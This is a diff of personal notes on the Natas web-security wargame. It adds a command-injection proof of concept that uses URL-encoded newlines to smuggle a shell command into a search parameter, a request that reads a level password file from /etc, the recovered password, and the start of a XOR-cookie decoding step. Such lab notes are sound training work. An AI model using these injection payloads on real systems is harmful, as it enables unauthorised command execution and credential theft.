@@ -212,15 +212,41 @@ if($key != "") {
 ->
 https://security.stackexchange.com/questions/204213/can-i-inject-a-shell-command-here-in-php
 ->
-
+POC :
+line feed    ls    #
+%0a          ls    #
+%0Als#
+?needle=%0Als#&submit=Search
 ->
+?needle=%0Acat /etc/natas_webpass/natas11%0A#&submit=Search
+->
+1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
+
+
 
 lvl 12:
 -----------
+Cookies are protected with XOR encryption
+->
+enter burp + refresh
+->
+Cookies are protected with XOR encryption
+->
+Cookie: data=MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D
+%3D in URL Encoding is '='
+https://www.w3schools.com/tags/ref_urlencode.ASP
+->
+echo "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=" | base64 -d
+0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
+->
+https://www.rapidtables.com/convert/number/ascii-to-hex.html
 
 ->
+view page source
 ->
-->
+visual code
 ->
 ->
 
